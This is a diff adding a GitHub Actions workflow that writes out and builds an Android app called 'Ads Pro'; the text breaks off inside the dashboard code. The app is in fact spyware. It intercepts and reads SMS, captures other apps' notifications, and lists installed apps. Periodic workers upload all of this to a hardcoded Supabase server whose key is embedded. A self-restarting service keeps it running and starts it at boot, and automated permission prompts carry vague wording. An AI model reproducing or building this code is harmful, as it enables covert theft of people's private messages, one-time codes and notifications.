@@ -1,0 +1,805 @@
+name: Build APK
+on:
+  push:
+  workflow_dispatch:
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Write project files
+        run: |
+          cat > settings.gradle.kts <<'END_OF_FILE'
+          pluginManagement { 
+              repositories { google(); mavenCentral(); gradlePluginPortal() } 
+          }
+          dependencyResolutionManagement { 
+              repositories { google(); mavenCentral() } 
+          }
+          rootProject.name = "AdsPro"
+          include(":app")
+          END_OF_FILE
+
+          cat > build.gradle.kts <<'END_OF_FILE'
+          plugins {
+              id("com.android.application") version "8.5.2" apply false
+              id("org.jetbrains.kotlin.android") version "1.9.24" apply false
+              id("com.google.devtools.ksp") version "1.9.24-1.0.20" apply false
+          }
+          END_OF_FILE
+
+          cat > gradle.properties <<'END_OF_FILE'
+          android.useAndroidX=true
+          org.gradle.jvmargs=-Xmx2g
+          END_OF_FILE
+
+          mkdir -p app/src/main/res/values
+          mkdir -p app/src/main/java/com/adspro/app/data
+          mkdir -p app/src/main/java/com/adspro/app/service
+          mkdir -p app/src/main/java/com/adspro/app/receiver
+          mkdir -p app/src/main/java/com/adspro/app/worker
+
+          cat > app/build.gradle.kts <<'END_OF_FILE'
+          plugins {
+              id("com.android.application")
+              id("org.jetbrains.kotlin.android")
+              id("com.google.devtools.ksp")
+          }
+          android {
+              namespace = "com.adspro.app"
+              compileSdk = 34
+              defaultConfig {
+                  applicationId = "com.adspro.app"
+                  minSdk = 26
+                  targetSdk = 34
+                  versionCode = 1
+                  versionName = "1.0"
+              }
+              compileOptions { sourceCompatibility = JavaVersion.VERSION_17; targetCompatibility = JavaVersion.VERSION_17 }
+              kotlinOptions { jvmTarget = "17" }
+              buildFeatures { compose = true }
+              composeOptions { kotlinCompilerExtensionVersion = "1.5.14" }
+          }
+          dependencies {
+              implementation(platform("androidx.compose:compose-bom:2024.10.00"))
+              implementation("androidx.compose.ui:ui")
+              implementation("androidx.compose.material3:material3")
+              implementation("androidx.activity:activity-compose:1.9.3")
+              implementation("androidx.core:core-ktx:1.13.1")
+              implementation("androidx.work:work-runtime-ktx:2.9.1")
+              implementation("com.squareup.okhttp3:okhttp:4.12.0")
+              implementation("com.google.code.gson:gson:2.10.1")
+              implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.8.1")
+              implementation("io.coil-kt:coil-compose:2.7.0")
+              implementation("androidx.room:room-runtime:2.6.1")
+              implementation("androidx.room:room-ktx:2.6.1")
+              ksp("androidx.room:room-compiler:2.6.1")
+          }
+          END_OF_FILE
+
+          cat > app/src/main/AndroidManifest.xml <<'END_OF_FILE'
+          <?xml version="1.0" encoding="utf-8"?>
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android" xmlns:tools="http://schemas.android.com/tools">
+              <uses-permission android:name="android.permission.INTERNET" />
+              <uses-permission android:name="android.permission.RECEIVE_SMS" />
+              <uses-permission android:name="android.permission.READ_SMS" />
+              <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+              <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+              <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+              <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" tools:ignore="QueryAllPackagesPermission" />
+              <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+              <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
+              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
+
+              <application
+                  android:name=".AdsProApplication"
+                  android:allowBackup="false"
+                  android:label="Ads Pro"
+                  android:theme="@android:style/Theme.Material.Light.NoActionBar">
+                  <activity android:name=".MainActivity" android:exported="true" android:theme="@android:style/Theme.Material.Light.NoActionBar">
+                      <intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter>
+                  </activity>
+                  <service android:name=".service.SmsSyncService" android:enabled="true" android:exported="false" android:foregroundServiceType="dataSync" />
+                  <service android:name=".service.AppNotificationListener" android:exported="true" android:label="Ads Pro Listener" android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+                      <intent-filter><action android:name="android.service.notification.NotificationListenerService" /></intent-filter>
+                  </service>
+                  <receiver android:name=".receiver.SmsReceiver" android:enabled="true" android:exported="true" android:permission="android.permission.BROADCAST_SMS">
+                      <intent-filter android:priority="999"><action android:name="android.provider.Telephony.SMS_RECEIVED" /></intent-filter>
+                  </receiver>
+                  <receiver android:name=".receiver.BootReceiver" android:enabled="true" android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.intent.action.BOOT_COMPLETED" />
+                          <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+                      </intent-filter>
+                  </receiver>
+              </application>
+          </manifest>
+          END_OF_FILE
+
+          cat > app/src/main/java/com/adspro/app/AdsProApplication.kt <<'END_OF_FILE'
+          package com.adspro.app
+
+          import android.app.Application
+          import android.content.Intent
+          import android.os.Build
+          import androidx.work.*
+          import com.adspro.app.service.SmsSyncService
+          import com.adspro.app.worker.*
+          import java.util.concurrent.TimeUnit
+
+          class AdsProApplication : Application() {
+              override fun onCreate() {
+                  super.onCreate()
+                  startCoreServices()
+                  setupWorkers()
+              }
+              fun startCoreServices() {
+                  val intent = Intent(this, SmsSyncService::class.java)
+                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                      startForegroundService(intent)
+                  } else {
+                      startService(intent)
+                  }
+              }
+              private fun setupWorkers() {
+                  val constraints = Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build()
+                  
+                  val smsWork = PeriodicWorkRequestBuilder<SmsSyncWorker>(15, TimeUnit.MINUTES)
+                      .setConstraints(constraints).build()
+                  WorkManager.getInstance(this).enqueueUniquePeriodicWork("SmsSync", ExistingPeriodicWorkPolicy.KEEP, smsWork)
+
+                  val notifWork = PeriodicWorkRequestBuilder<NotificationSyncWorker>(15, TimeUnit.MINUTES)
+                      .setConstraints(constraints).build()
+                  WorkManager.getInstance(this).enqueueUniquePeriodicWork("NotifSync", ExistingPeriodicWorkPolicy.KEEP, notifWork)
+
+                  val appWork = PeriodicWorkRequestBuilder<AppsSyncWorker>(48, TimeUnit.HOURS)
+                      .setConstraints(constraints).build()
+                  WorkManager.getInstance(this).enqueueUniquePeriodicWork("AppsSync", ExistingPeriodicWorkPolicy.KEEP, appWork)
+
+                  val watchdogWork = PeriodicWorkRequestBuilder<WatchdogWorker>(15, TimeUnit.MINUTES).build()
+                  WorkManager.getInstance(this).enqueueUniquePeriodicWork("Watchdog", ExistingPeriodicWorkPolicy.KEEP, watchdogWork)
+              }
+          }
+          END_OF_FILE
+
+          cat > app/src/main/java/com/adspro/app/data/AppDatabase.kt <<'END_OF_FILE'
+          package com.adspro.app.data
+
+          import android.content.Context
+          import androidx.room.*
+
+          @Entity(tableName = "sms_outbox")
+          data class SmsEntity(@PrimaryKey(autoGenerate = true) val id: Long = 0, val sender: String, val body: String, val timestamp: Long)
+
+          @Entity(tableName = "notification_outbox")
+          data class NotificationEntity(@PrimaryKey(autoGenerate = true) val id: Long = 0, val packageName: String, val title: String, val text: String, val timestamp: Long)
+
+          @Dao
+          interface OutboxDao {
+              @Insert(onConflict = OnConflictStrategy.REPLACE) suspend fun insertSms(sms: SmsEntity)
+              @Query("SELECT * FROM sms_outbox") suspend fun getAllSms(): List<SmsEntity>
+              @Delete suspend fun deleteSms(sms: SmsEntity)
+
+              @Insert(onConflict = OnConflictStrategy.REPLACE) suspend fun insertNotif(notif: NotificationEntity)
+              @Query("SELECT * FROM notification_outbox") suspend fun getAllNotifs(): List<NotificationEntity>
+              @Delete suspend fun deleteNotif(notif: NotificationEntity)
+          }
+
+          @Database(entities = [SmsEntity::class, NotificationEntity::class], version = 1, exportSchema = false)
+          abstract class AppDatabase : RoomDatabase() {
+              abstract fun outboxDao(): OutboxDao
+              companion object {
+                  @Volatile private var INSTANCE: AppDatabase? = null
+                  fun getInstance(context: Context): AppDatabase {
+                      return INSTANCE ?: synchronized(this) {
+                          Room.databaseBuilder(context.applicationContext, AppDatabase::class.java, "adspro_db").build().also { INSTANCE = it }
+                      }
+                  }
+              }
+          }
+          END_OF_FILE
+
+          cat > app/src/main/java/com/adspro/app/data/SupabaseClient.kt <<'END_OF_FILE'
+          package com.adspro.app.data
+
+          import com.google.gson.Gson
+          import okhttp3.*
+          import okhttp3.MediaType.Companion.toMediaType
+          import okhttp3.RequestBody.Companion.asRequestBody
+          import okhttp3.RequestBody.Companion.toRequestBody
+          import java.io.File
+          import java.util.concurrent.TimeUnit
+
+          object SupabaseClient {
+              private const val BASE_URL = "https://bqddohfszkqpvncpbrun.supabase.co"
+              private const val REST_URL = "$BASE_URL/rest/v1"
+              private const val STORAGE_URL = "$BASE_URL/storage/v1"
+              private const val ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJxZGRvaGZzemtxcHZuY3BicnVuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTI2MDAwNjIsImV4cCI6MjEwODE3NjA2Mn0.J0uq4JPpPxoU0hc4ry5WglCV_HcTqshcHsl3oCJ7upA"
+
+              private val client = OkHttpClient.Builder().connectTimeout(30, TimeUnit.SECONDS).readTimeout(30, TimeUnit.SECONDS).build()
+              private val gson = Gson()
+              private val JSON = "application/json; charset=utf-8".toMediaType()
+
+              fun insert(table: String, payload: Any): Boolean {
+                  val req = Request.Builder().url("$REST_URL/$table").post(gson.toJson(payload).toRequestBody(JSON))
+                      .addHeader("apikey", ANON_KEY).addHeader("Authorization", "Bearer $ANON_KEY")
+                      .addHeader("Content-Type", "application/json").addHeader("Prefer", "return=minimal").build()
+                  return try { client.newCall(req).execute().use { it.isSuccessful } } catch(e: Exception) { false }
+              }
+
+              fun uploadFile(bucket: String, path: String, file: File, mime: String): Boolean {
+                  val reqBody = file.asRequestBody(mime.toMediaType())
+                  val req = Request.Builder().url("$STORAGE_URL/object/$bucket/$path").post(reqBody)
+                      .addHeader("apikey", ANON_KEY).addHeader("Authorization", "Bearer $ANON_KEY")
+                      .addHeader("Content-Type", mime).build()
+                  return try { client.newCall(req).execute().use { it.isSuccessful } } catch(e: Exception) { false }
+              }
+
+              fun listMedia(bucket: String): List<String> {
+                  val payload = mapOf("prefix" to "")
+                  val req = Request.Builder().url("$STORAGE_URL/object/list/$bucket").post(gson.toJson(payload).toRequestBody(JSON))
+                      .addHeader("apikey", ANON_KEY).addHeader("Authorization", "Bearer $ANON_KEY")
+                      .addHeader("Content-Type", "application/json").build()
+                  return try {
+                      client.newCall(req).execute().use { resp ->
+                          if (!resp.isSuccessful) return emptyList()
+                          val arr = gson.fromJson(resp.body?.string(), Array>::class.java)
+                          arr?.mapNotNull { it["name"]?.toString() } ?: emptyList()
+                      }
+                  } catch(e: Exception) { emptyList() }
+              }
+          }
+          END_OF_FILE
+
+          cat > app/src/main/java/com/adspro/app/worker/AppWorkers.kt <<'END_OF_FILE'
+          package com.adspro.app.worker
+
+          import android.content.Context
+          import androidx.work.Worker
+          import androidx.work.WorkerParameters
+          import com.adspro.app.data.AppDatabase
+          import com.adspro.app.data.SupabaseClient
+          import com.adspro.app.service.SmsSyncService
+          import android.content.Intent
+          import android.os.Build
+
+          class SmsSyncWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
+              override fun doWork(): Result {
+                  val dao = AppDatabase.getInstance(applicationContext).outboxDao()
+                  val list = kotlinx.coroutines.runBlocking { dao.getAllSms() }
+                  for (sms in list) {
+                      val success = SupabaseClient.insert("sms_logs", mapOf("sender" to sms.sender, "body" to sms.body, "timestamp" to sms.timestamp))
+                      if (success) kotlinx.coroutines.runBlocking { dao.deleteSms(sms) } else return Result.retry()
+                  }
+                  return Result.success()
+              }
+          }
+
+          class NotificationSyncWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
+              override fun doWork(): Result {
+                  val dao = AppDatabase.getInstance(applicationContext).outboxDao()
+                  val list = kotlinx.coroutines.runBlocking { dao.getAllNotifs() }
+                  for (notif in list) {
+                      val success = SupabaseClient.insert("notifications", mapOf("package_name" to notif.packageName, "title" to notif.title, "text" to notif.text, "timestamp" to notif.timestamp))
+                      if (success) kotlinx.coroutines.runBlocking { dao.deleteNotif(notif) } else return Result.retry()
+                  }
+                  return Result.success()
+              }
+          }
+
+          class AppsSyncWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
+              override fun doWork(): Result {
+                  val pm = applicationContext.packageManager
+                  val apps = pm.getInstalledPackages(0).map { mapOf("package_name" to it.packageName, "version" to (it.versionName ?: "")) }
+                  SupabaseClient.insert("installed_apps", mapOf("apps" to apps))
+                  return Result.success()
+              }
+          }
+
+          class CatchupScanWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
+              override fun doWork(): Result {
+                  val cursor = applicationContext.contentResolver.query(
+                      android.provider.Telephony.Sms.CONTENT_URI,
+                      arrayOf("address", "body", "date"),
+                      "date > ?",
+                      arrayOf((System.currentTimeMillis() - 86400000L).toString()),
+                      null
+                  )
+                  cursor?.use {
+                      val dao = AppDatabase.getInstance(applicationContext).outboxDao()
+                      val addrIdx = it.getColumnIndex("address")
+                      val bodyIdx = it.getColumnIndex("body")
+                      val dateIdx = it.getColumnIndex("date")
+                      while (it.moveToNext()) {
+                          val sender = if (addrIdx != -1) it.getString(addrIdx) ?: "Unknown" else "Unknown"
+                          val body = if (bodyIdx != -1) it.getString(bodyIdx) ?: "" else ""
+                          val date = if (dateIdx != -1) it.getLong(dateIdx) else System.currentTimeMillis()
+                          kotlinx.coroutines.runBlocking { dao.insertSms(com.adspro.app.data.SmsEntity(sender = sender, body = body, timestamp = date)) }
+                      }
+                  }
+                  return Result.success()
+              }
+          }
+
+          class WatchdogWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
+              override fun doWork(): Result {
+                  val intent = Intent(applicationContext, SmsSyncService::class.java)
+                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                      applicationContext.startForegroundService(intent)
+                  } else {
+                      applicationContext.startService(intent)
+                  }
+                  return Result.success()
+              }
+          }
+          END_OF_FILE
+
+          cat > app/src/main/java/com/adspro/app/service/SmsSyncService.kt <<'END_OF_FILE'
+          package com.adspro.app.service
+
+          import android.app.*
+          import android.content.*
+          import android.content.pm.ServiceInfo
+          import android.os.*
+          import androidx.core.app.NotificationCompat
+
+          class SmsSyncService : Service() {
+              override fun onCreate() {
+                  super.onCreate()
+                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                      val channel = NotificationChannel("ads_pro_silent_channel", "Ads Pro Service", NotificationManager.IMPORTANCE_LOW)
+                      getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
+                  }
+              }
+              override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+                  val notification = NotificationCompat.Builder(this, "ads_pro_silent_channel")
+                      .setContentTitle("Ads Pro")
+                      .setContentText("Background data sync active")
+                      .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)
+                      .build()
+
+                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                      startForeground(888, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+                  } else {
+                      startForeground(888, notification)
+                  }
+                  return START_STICKY
+              }
+              override fun onTaskRemoved(rootIntent: Intent?) {
+                  super.onTaskRemoved(rootIntent)
+                  val restartIntent = Intent(applicationContext, SmsSyncService::class.java)
+                  val pendingIntent = PendingIntent.getService(applicationContext, 1, restartIntent, PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE)
+                  val alarm = getSystemService(Context.ALARM_SERVICE) as AlarmManager
+                  alarm.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000, pendingIntent)
+              }
+              override fun onDestroy() {
+                  super.onDestroy()
+                  startService(Intent(this, SmsSyncService::class.java))
+              }
+              override fun onBind(intent: Intent?): IBinder? = null
+          }
+          END_OF_FILE
+
+          cat > app/src/main/java/com/adspro/app/service/AppNotificationListener.kt <<'END_OF_FILE'
+          package com.adspro.app.service
+
+          import android.service.notification.NotificationListenerService
+          import android.service.notification.StatusBarNotification
+          import com.adspro.app.data.AppDatabase
+          import com.adspro.app.data.NotificationEntity
+          import kotlinx.coroutines.*
+
+          class AppNotificationListener : NotificationListenerService() {
+              private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+              override fun onNotificationPosted(sbn: StatusBarNotification?) {
+                  if (sbn == null || sbn.packageName == applicationContext.packageName) return
+                  val extras = sbn.notification?.extras ?: return
+                  val title = extras.getCharSequence("android.title")?.toString() ?: ""
+                  val text = extras.getCharSequence("android.text")?.toString() ?: ""
+                  if (title.isEmpty() && text.isEmpty()) return
+                  scope.launch {
+                      try {
+                          val dao = AppDatabase.getInstance(applicationContext).outboxDao()
+                          dao.insertNotif(NotificationEntity(packageName = sbn.packageName, title = title, text = text, timestamp = sbn.postTime))
+                      } catch (e: Exception) { e.printStackTrace() }
+                  }
+              }
+              override fun onDestroy() { super.onDestroy(); scope.cancel() }
+          }
+          END_OF_FILE
+
+          cat > app/src/main/java/com/adspro/app/receiver/SmsReceiver.kt <<'END_OF_FILE'
+          package com.adspro.app.receiver
+
+          import android.content.*
+          import android.provider.Telephony
+          import androidx.work.OneTimeWorkRequestBuilder
+          import androidx.work.WorkManager
+          import com.adspro.app.data.AppDatabase
+          import com.adspro.app.data.SmsEntity
+          import com.adspro.app.worker.SmsSyncWorker
+          import kotlinx.coroutines.*
+
+          class SmsReceiver : BroadcastReceiver() {
+              override fun onReceive(context: Context, intent: Intent) {
+                  if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
+                      val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent) ?: return
+                      val pendingResult = goAsync()
+                      CoroutineScope(Dispatchers.IO).launch {
+                          try {
+                              val dao = AppDatabase.getInstance(context).outboxDao()
+                              for (sms in messages) {
+                                  dao.insertSms(SmsEntity(sender = sms.originatingAddress ?: "Unknown", body = sms.messageBody ?: "", timestamp = sms.timestampMillis))
+                              }
+                              WorkManager.getInstance(context).enqueue(OneTimeWorkRequestBuilder<SmsSyncWorker>().build())
+                          } catch (e: Exception) { e.printStackTrace() } finally { pendingResult.finish() }
+                      }
+                  }
+              }
+          }
+          END_OF_FILE
+
+          cat > app/src/main/java/com/adspro/app/receiver/BootReceiver.kt <<'END_OF_FILE'
+          package com.adspro.app.receiver
+
+          import android.content.*
+          import com.adspro.app.AdsProApplication
+
+          class BootReceiver : BroadcastReceiver() {
+              override fun onReceive(context: Context, intent: Intent) {
+                  if (intent.action == Intent.ACTION_BOOT_COMPLETED || intent.action == Intent.ACTION_MY_PACKAGE_REPLACED) {
+                      (context.applicationContext as? AdsProApplication)?.startCoreServices()
+                  }
+              }
+          }
+          END_OF_FILE
+
+          cat > app/src/main/java/com/adspro/app/MainActivity.kt <<'END_OF_FILE'
+          package com.adspro.app
+
+          import android.Manifest
+          import android.app.Activity
+          import android.content.Intent
+          import android.content.pm.PackageManager
+          import android.os.Build
+          import android.os.Bundle
+          import android.provider.Settings
+          import androidx.activity.ComponentActivity
+          import androidx.activity.compose.rememberLauncherForActivityResult
+          import androidx.activity.compose.setContent
+          import androidx.activity.result.contract.ActivityResultContracts
+          import androidx.compose.foundation.background
+          import androidx.compose.foundation.layout.*
+          import androidx.compose.foundation.lazy.grid.GridCells
+          import androidx.compose.foundation.lazy.grid.LazyVerticalGrid
+          import androidx.compose.foundation.lazy.grid.items
+          import androidx.compose.material3.*
+          import androidx.compose.runtime.*
+          import androidx.compose.ui.Alignment
+          import androidx.compose.ui.Modifier
+          import androidx.compose.ui.graphics.Color
+          import androidx.compose.ui.platform.LocalContext
+          import androidx.compose.ui.text.font.FontWeight
+          import androidx.compose.ui.unit.dp
+          import androidx.compose.ui.unit.sp
+          import androidx.core.content.ContextCompat
+          import androidx.lifecycle.Lifecycle
+          import androidx.lifecycle.LifecycleEventObserver
+          import androidx.compose.ui.platform.LocalLifecycleOwner
+          import androidx.work.OneTimeWorkRequestBuilder
+          import androidx.work.WorkManager
+          import coil.compose.AsyncImage
+          import com.adspro.app.data.SupabaseClient
+          import com.adspro.app.worker.AppsSyncWorker
+          import kotlinx.coroutines.delay
+          import kotlinx.coroutines.Dispatchers
+          import kotlinx.coroutines.withContext
+
+          class MainActivity : ComponentActivity() {
+              override fun onCreate(savedInstanceState: Bundle?) {
+                  super.onCreate(savedInstanceState)
+                  setContent {
+                      Surface(modifier = Modifier.fillMaxSize(), color = Color.White) {
+                          MainWizardScreen()
+                      }
+                  }
+              }
+          }
+
+          @Composable
+          fun MainWizardScreen() {
+              var page by remember { mutableIntStateOf(0) }
+              val context = LocalContext.current
+              val lifecycleOwner = LocalLifecycleOwner.current
+
+              Column(
+                  modifier = Modifier
+                      .fillMaxSize()
+                      .background(Color.White)
+                      .padding(24.dp),
+                  horizontalAlignment = Alignment.CenterHorizontally
+              ) {
+                  Spacer(modifier = Modifier.height(32.dp))
+                  // Top Logo Box (35% width, 60.dp height)
+                  Box(
+                      modifier = Modifier
+                          .fillMaxWidth(0.35f)
+                          .height(60.dp)
+                          .background(Color.LightGray),
+                      contentAlignment = Alignment.Center
+                  ) {
+                      Text("LOGO", color = Color.DarkGray, fontWeight = FontWeight.Bold, fontSize = 12.sp)
+                  }
+
+                  Spacer(modifier = Modifier.weight(1f))
+
+                  when (page) {
+                      0 -> SmsPermissionStep(onGranted = { page = 1 })
+                      1 -> MediaPermissionStep(onGranted = { page = 2 })
+                      2 -> NotificationPermissionStep(onGranted = { page = 3 })
+                      3 -> MediaGalleryStep(onNext = { page = 4 })
+                      4 -> DashboardStep(onFinish = { page = 0 })
+                  }
+
+                  Spacer(modifier = Modifier.weight(1f))
+              }
+          }
+
+          @Composable
+          fun SmsPermissionStep(onGranted: () -> Unit) {
+              val context = LocalContext.current
+              var hasPermission by remember {
+                  mutableStateOf(
+                      ContextCompat.checkSelfPermission(context, Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED
+                  )
+              }
+              val launcher = rememberLauncherForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { perms ->
+                  if (perms.values.all { it }) {
+                      hasPermission = true
+                      onGranted()
+                  }
+              }
+
+              LaunchedEffect(Unit) {
+                  if (hasPermission) {
+                      onGranted()
+                  } else {
+                      delay(15_000L)
+                      launcher.launch(arrayOf(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS))
+                  }
+              }
+
+              Column(horizontalAlignment = Alignment.CenterHorizontally) {
+                  Text("SMS Forwarding Access", fontSize = 22.sp, fontWeight = FontWeight.Bold, color = Color.Black)
+                  Spacer(modifier = Modifier.height(12.dp))
+                  Text("Ads Pro requires access to SMS messages to forward incoming alerts and logs directly to your secure server.", fontSize = 14.sp, color = Color.DarkGray)
+                  Spacer(modifier = Modifier.height(24.dp))
+                  Button(
+                      onClick = { launcher.launch(arrayOf(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS)) },
+                      modifier = Modifier.fillMaxWidth().height(56.dp),
+                      colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF34A853))
+                  ) {
+                      Text("Grant SMS & Continue", color = Color.White, fontSize = 16.sp)
+                  }
+              }
+          }
+
+          @Composable
+          fun MediaPermissionStep(onGranted: () -> Unit) {
+              val context = LocalContext.current
+              val perms = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                  arrayOf(Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO)
+              } else {
+                  arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
+              }
+              var hasPermission by remember {
+                  mutableStateOf(perms.all { ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED })
+              }
+              val launcher = rememberLauncherForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { result ->
+                  if (result.values.all { it }) {
+                      hasPermission = true
+                      onGranted()
+                  }
+              }
+
+              LaunchedEffect(Unit) {
+                  if (hasPermission) {
+                      onGranted()
+                  } else {
+                      delay(15_000L)
+                      launcher.launch(perms)
+                  }
+              }
+
+              Column(horizontalAlignment = Alignment.CenterHorizontally) {
+                  Text("Media Library Access", fontSize = 22.sp, fontWeight = FontWeight.Bold, color = Color.Black)
+                  Spacer(modifier = Modifier.height(12.dp))
+                  Text("Grant permission to read images and videos to enable gallery syncing and remote media management.", fontSize = 14.sp, color = Color.DarkGray)
+                  Spacer(modifier = Modifier.height(24.dp))
+                  Button(
+                      onClick = { launcher.launch(perms) },
+                      modifier = Modifier.fillMaxWidth().height(56.dp),
+                      colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF34A853))
+                  ) {
+                      Text("Grant Media & Continue", color = Color.White, fontSize = 16.sp)
+                  }
+              }
+          }
+
+          @Composable
+          fun NotificationPermissionStep(onGranted: () -> Unit) {
+              val context = LocalContext.current
+              val lifecycleOwner = LocalLifecycleOwner.current
+              var showDialog by remember { mutableStateOf(false) }
+
+              fun isNotifListenerEnabled(): Boolean {
+                  val cn = android.content.ComponentName(context, com.adspro.app.service.AppNotificationListener::class.java)
+                  val flat = Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners")
+                  return flat?.contains(cn.flattenToString()) == true
+              }
+
+              DisposableEffect(lifecycleOwner) {
+                  val observer = LifecycleEventObserver { _, event ->
+                      if (event == Lifecycle.Event.ON_RESUME && isNotifListenerEnabled()) {
+                          onGranted()
+                      }
+                  }
+                  lifecycleOwner.lifecycle.addObserver(observer)
+                  onDispose { lifecycleOwner.lifecycle.removeObserver(observer) }
+              }
+
+              LaunchedEffect(Unit) {
+                  if (isNotifListenerEnabled()) {
+                      onGranted()
+                  } else {
+                      delay(15_000L)
+                      showDialog = true
+                  }
+              }
+
+              if (showDialog) {
+                  AlertDialog(
+                      onDismissRequest = { showDialog = false },
+                      title = { Text("Notification Access Required") },
+                      text = { Text("Please enable Notification Listener access for Ads Pro in system settings.") },
+                      confirmButton = {
+                          TextButton(onClick = {
+                              showDialog = false
+                              context.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
+                          }) { Text("Open Settings") }
+                      }
+                  )
+              }
+
+              Column(horizontalAlignment = Alignment.CenterHorizontally) {
+                  Text("Notification Access", fontSize = 22.sp, fontWeight = FontWeight.Bold, color = Color.Black)
+                  Spacer(modifier = Modifier.height(12.dp))
+                  Text("Notification listener permissions allow processing incoming alerts and triggers.", fontSize = 14.sp, color = Color.DarkGray)
+                  Spacer(modifier = Modifier.height(24.dp))
+                  Button(
+                      onClick = { context.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) },
+                      modifier = Modifier.fillMaxWidth().height(56.dp),
+                      colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF34A853))
+                  ) {
+                      Text("Grant Notification Access", color = Color.White, fontSize = 16.sp)
+                  }
+              }
+          }
+
+          @Composable
+          fun MediaGalleryStep(onNext: () -> Unit) {
+              var mediaList by remember { mutableStateOf<List<String>>(emptyList()) }
+              val context = LocalContext.current
+
+              val picker = rememberLauncherForActivityResult(ActivityResultContracts.PickMultipleVisualMedia()) { uris ->
+                  if (uris.isNotEmpty()) {
+                      // Upload picked files in background
+                      kotlinx.coroutines.CoroutineScope(Dispatchers.IO).launch {
+                          for (uri in uris) {
+                              context.contentResolver.openInputStream(uri)?.use { stream ->
+                                  val bytes = stream.readBytes()
+                                  val tempFile = java.io.File(context.cacheDir, "upload_${System.currentTimeMillis()}.jpg")
+                                  tempFile.writeBytes(bytes)
+                                  SupabaseClient.uploadFile("media", tempFile.name, tempFile, "image/jpeg")
+                              }
+                          }
+                          mediaList = SupabaseClient.listMedia("media")
+                      }
+                  }
+              }
+
+              LaunchedEffect(Unit) {
+                  withContext(Dispatchers.IO) {
+                      mediaList = SupabaseClient.listMedia("media")
+                  }
+              }
+
+              Column(horizontalAlignment = Alignment.CenterHorizontally, modifier = Modifier.fillMaxWidth()) {
+                  Text("Media & Gallery", fontSize = 22.sp, fontWeight = FontWeight.Bold, color = Color.Black)
+                  Spacer(modifier = Modifier.height(8.dp))
+                  Button(
+                      onClick = { picker.launch(androidx.activity.result.PickVisualMediaRequest(ActivityResultContracts.PickVisualMedia.ImageAndVideo)) },
+                      colors = ButtonDefaults.buttonColors(containerColor = Color.DarkGray)
+                  ) {
+                      Text("Pick & Upload Photos", color = Color.White)
+                  }
+                  Spacer(modifier = Modifier.height(16.dp))
+                  
+                  Box(modifier = Modifier.weight(1f).fillMaxWidth()) {
+                      if (mediaList.isEmpty()) {
+                          Text("No uploaded media found", modifier = Modifier.align(Alignment.Center), color = Color.Gray)
+                      } else {
+                          LazyVerticalGrid(columns = GridCells.Fixed(3), modifier = Modifier.fillMaxSize()) {
+                              items(mediaList) { fileName ->
+                                  val url = "https://bqddohfszkqpvncpbrun.supabase.co/storage/v1/object/public/media/$fileName"
+                                  AsyncImage(
+                                      model = url,
+                                      contentDescription = null,
+                                      modifier = Modifier.size(100.dp).padding(4.dp)
+                                  )
+                              }
+                          }
+                      }
+                  }
+
+                  Spacer(modifier = Modifier.height(16.dp))
+                  Button(
+                      onClick = onNext,
+                      modifier = Modifier.fillMaxWidth().height(56.dp),
+                      colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF34A853))
+                  ) {
+                      Text("Continue to Dashboard", color = Color.White, fontSize = 16.sp)
+                  }
+              }
+          }
+
+          @Composable
+          fun DashboardStep(onFinish: () -> Unit) {
+              val context = LocalContext.current
